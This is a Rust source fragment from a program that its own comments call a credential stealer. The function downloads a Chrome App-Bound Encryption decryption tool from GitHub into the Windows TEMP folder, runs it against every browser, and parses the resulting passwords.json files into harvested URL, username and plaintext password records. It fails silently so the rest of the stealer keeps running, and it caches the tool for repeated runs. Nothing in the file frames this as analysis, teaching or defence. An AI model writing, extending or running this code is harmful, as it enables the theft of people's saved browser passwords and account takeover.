/// chromelevator passwords.json entry
#[derive(Deserialize)]
struct ChromelevatorPassword {
    url: Option<String>,
    user: Option<String>,
    pass: Option<String>,
}

/// Download chromelevator.exe from GitHub releases, run it, parse output.
/// Falls back silently on any error so the rest of the stealer still runs.
#[cfg(windows)]
fn steal_chromium_abe_subprocess_windows() -> Vec<DecryptedCredential> {
    use std::process::Command;

    let mut results: Vec<DecryptedCredential> = Vec::new();

    // --- paths ---
    let tmp = match std::env::var("TEMP").or_else(|_| std::env::var("TMP")) {
        Ok(t) => t,
        Err(_) => {
            println!("[-] ABE: no TEMP var, skipping");
            return results;
        }
    };
    let exe_path = format!("{}\\chromelevator.exe", tmp);
    let out_dir  = format!("{}\\clev_out", tmp);

    // --- download if not already present ---
    if !std::path::Path::new(&exe_path).exists() {
        println!("[+] ABE: downloading chromelevator zip...");
        let zip_url = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chrome-injector-v0.20.0.zip";
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(120))
            .user_agent("Mozilla/5.0")
            .build()
            .unwrap_or_default();
        let zip_bytes = match client.get(zip_url).send().and_then(|r| r.bytes()) {
            Ok(b) => b,
            Err(e) => {
                println!("[-] ABE: zip download failed: {}", e);
                return results;
            }
        };
        // Extract chromelevator_x64.exe from the in-memory zip
        use std::io::Cursor;
        let cursor = Cursor::new(&zip_bytes[..]);
        let mut archive = match zip::ZipArchive::new(cursor) {
            Ok(a) => a,
            Err(e) => {
                println!("[-] ABE: zip open failed: {}", e);
                return results;
            }
        };
        let exe_bytes = match archive.by_name("chromelevator_x64.exe") {
            Ok(mut entry) => {
                use std::io::Read;
                let mut buf = Vec::with_capacity(entry.size() as usize);
                if let Err(e) = entry.read_to_end(&mut buf) {
                    println!("[-] ABE: zip read entry failed: {}", e);
                    return results;
                }
                buf
            }
            Err(e) => {
                println!("[-] ABE: chromelevator_x64.exe not found in zip: {}", e);
                return results;
            }
        };
        if let Err(e) = fs::write(&exe_path, &exe_bytes) {
            println!("[-] ABE: write exe failed: {}", e);
            return results;
        }
        println!("[+] ABE: chromelevator.exe extracted and written ({} bytes)", exe_bytes.len());
    } else {
        println!("[+] ABE: chromelevator.exe already cached");
    }

    // --- create fresh output dir ---
    let _ = fs::remove_dir_all(&out_dir);
    if let Err(e) = fs::create_dir_all(&out_dir) {
        println!("[-] ABE: mkdir failed: {}", e);
        return results;
    }

    // --- run chromelevator ---
    println!("[+] ABE: running chromelevator...");
    match Command::new(&exe_path)
        .args(&["--output-path", &out_dir, "all"])
        .output()
    {
        Ok(out) => {
            println!(
                "[+] ABE: chromelevator exited (status: {})",
                out.status
            );
        }
        Err(e) => {
            println!("[-] ABE: exec failed: {}", e);
            let _ = fs::remove_file(&exe_path);
            return results;
        }
    }

    // --- walk output dir for passwords.json files ---
    // layout: <out_dir>/<BrowserName>/<ProfileName>/passwords.json
    let walker = match fs::read_dir(&out_dir) {
        Ok(w) => w,
        Err(e) => {
            println!("[-] ABE: read output dir failed: {}", e);
            let _ = fs::remove_dir_all(&out_dir);
            let _ = fs::remove_file(&exe_path);
            return results;
        }
    };

    for browser_entry in walker.flatten() {
        let browser_path = browser_entry.path();
        if !browser_path.is_dir() { continue; }
        let browser_name = browser_path
            .file_name()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string();

        let profiles = match fs::read_dir(&browser_path) {
            Ok(p) => p,
            Err(_) => continue,
        };

        for profile_entry in profiles.flatten() {
            let profile_path = profile_entry.path();
            if !profile_path.is_dir() { continue; }

            let pw_file = profile_path.join("passwords.json");
            if !pw_file.exists() { continue; }

            let content = match fs::read_to_string(&pw_file) {
                Ok(c) => c,
                Err(e) => {
                    println!("[-] ABE: read {} failed: {}", pw_file.display(), e);
                    continue;
                }
            };

            let entries: Vec<ChromelevatorPassword> = match serde_json::from_str(&content) {
                Ok(v) => v,
                Err(e) => {
                    println!("[-] ABE: parse {} failed: {}", pw_file.display(), e);
                    continue;
                }
            };

            for entry in entries {
                let url      = entry.url.unwrap_or_default();
                let username = entry.user.unwrap_or_default();
                let password = entry.pass.unwrap_or_default();
                if url.is_empty() && username.is_empty() && password.is_empty() {
                    continue;
                }
                println!(
                    "[+] ABE {} cred: {} | {}",
                    browser_name, url, username
                );
                results.push(DecryptedCredential {
                    url,
                    username,
                    password,
                    captured_at: Utc::now().to_rfc3339(),
                });
            }
        }
    }

    // --- cleanup ---
    let _ = fs::remove_dir_all(&out_dir);
    // leave chromelevator.exe cached for next run (avoids re-downloading every loop)

    results
}

